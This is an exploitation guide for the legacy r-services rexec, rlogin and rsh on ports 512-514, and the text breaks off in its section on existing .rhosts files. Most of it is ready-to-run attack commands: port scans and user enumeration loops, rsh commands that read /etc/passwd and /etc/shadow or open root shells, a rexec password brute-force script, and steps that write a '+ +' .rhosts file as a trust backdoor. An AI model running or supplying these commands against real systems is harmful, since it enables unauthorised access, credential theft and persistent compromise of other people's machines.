# üîê R-Services (Ports 512/513/514) - Exploitation Guide

## üéØ Vulnerability Overview

**Services:** R-Services (Berkeley r-commands)  
**Ports:** 
- 512/tcp - rexec (Remote Execution)
- 513/tcp - rlogin (Remote Login)  
- 514/tcp - rsh (Remote Shell)
**Vulnerability Type:** Trust-based Authentication, Weak Security Model  
**Severity:** High to Critical

### Description
R-services (rsh, rlogin, rexec) are legacy remote access protocols that rely on host-based authentication and trust relationships. They transmit data in plaintext and use weak authentication mechanisms, making them highly vulnerable to exploitation.

---

## üîç Reconnaissance Workflow

### Step 1: Service Detection

#### Port Scanning
```bash
# Quick r-services scan
nmap -p 512,513,514 <target-ip>

# Service version detection
nmap -sV -p 512,513,514 <target-ip>

# Comprehensive enumeration
nmap -sV -sC -p 512,513,514 --script rexec-brute,rsh-enum <target-ip>
```

#### Banner Grabbing
```bash
# rexec (512) banner
nc <target-ip> 512

# rlogin (513) banner  
nc <target-ip> 513

# rsh (514) banner
nc <target-ip> 514

# Using telnet
telnet <target-ip> 512
telnet <target-ip> 513
telnet <target-ip> 514
```

### Step 2: Trust Relationship Discovery

#### Check for Trust Relationships
```bash
# Test rlogin without authentication
rlogin <target-ip>
rlogin -l root <target-ip>
rlogin -l admin <target-ip>

# Test rsh command execution
rsh <target-ip> id
rsh <target-ip> -l root id
rsh <target-ip> -l root whoami

# Test various usernames
for user in root admin user guest; do
    echo "Testing user: $user"
    rsh <target-ip> -l $user id
done
```

#### .rhosts File Analysis
```bash
# Common .rhosts file locations to check (if you gain access)
/root/.rhosts
/home/user/.rhosts
~/.rhosts

# Common .rhosts entries that indicate trust
+ +                    # Trust everyone (extremely dangerous)
+ root                # Trust root from any host
hostname root         # Trust root from specific hostname
192.168.1.5 admin     # Trust specific user from specific IP
```

### Step 3: User Enumeration

#### Username Discovery
```bash
# Test common usernames via rlogin
for user in root admin administrator user guest oracle postgres mysql; do
    echo "Trying user: $user"
    timeout 5 rlogin -l $user <target-ip> 2>&1 | head -3
done

# Using finger service (if available)
finger @<target-ip>
finger root@<target-ip>
finger user@<target-ip>
```

---

## üí• Exploitation Workflow

### Method 1: Trust Relationship Abuse

#### Direct Remote Login
```bash
# Test direct rlogin access
rlogin <target-ip>
rlogin -l root <target-ip>
rlogin -l admin <target-ip>

# If successful, you get an interactive shell
whoami
id
uname -a
```

#### Remote Command Execution
```bash
# Execute commands via rsh
rsh <target-ip> id
rsh <target-ip> whoami
rsh <target-ip> "cat /etc/passwd"
rsh <target-ip> "ls -la /root"

# With specific user
rsh <target-ip> -l root "cat /etc/shadow"
rsh <target-ip> -l admin "sudo -l"

# Multi-command execution
rsh <target-ip> -l root "id; whoami; hostname; uname -a"
```

#### Interactive Shell via rsh
```bash
# Get interactive shell through rsh
rsh <target-ip> -l root /bin/bash
rsh <target-ip> -l root /bin/sh

# Alternative method
rsh <target-ip> -l root "bash -i"
rsh <target-ip> -l root "sh -i"
```

### Method 2: rexec Exploitation

#### Username/Password Authentication
```bash
# rexec requires username and password
rexec <target-ip> -l root -p password id
rexec <target-ip> -l admin -p admin whoami

# Test common credentials
rexec <target-ip> -l root -p root id
rexec <target-ip> -l root -p toor id
rexec <target-ip> -l admin -p admin id
```

#### Automated rexec Brute Force
```bash
# Using Nmap script
nmap --script rexec-brute -p 512 <target-ip>

# Manual script approach
#!/bin/bash
target=$1
users=("root" "admin" "user")
passwords=("" "root" "admin" "password" "123456")

for user in "${users[@]}"; do
    for pass in "${passwords[@]}"; do
        echo "Trying $user:$pass"
        timeout 5 rexec $target -l $user -p $pass id 2>/dev/null
    done
done
```

### Method 3: .rhosts File Manipulation

#### Creating Malicious .rhosts
```bash
# If you have write access to user's home directory
echo "+ +" > ~/.rhosts
echo "<your-ip> <your-username>" >> ~/.rhosts
chmod 644 ~/.rhosts

# More specific trust relationship
echo "attacker-hostname root" > ~/.rhosts
echo "192.168.1.100 admin" >> ~/.rhosts
```

#### Exploiting Existing .rhosts
```bash
# If .rhosts exists with weak permissions
# Look for entries like:
# + +
# + root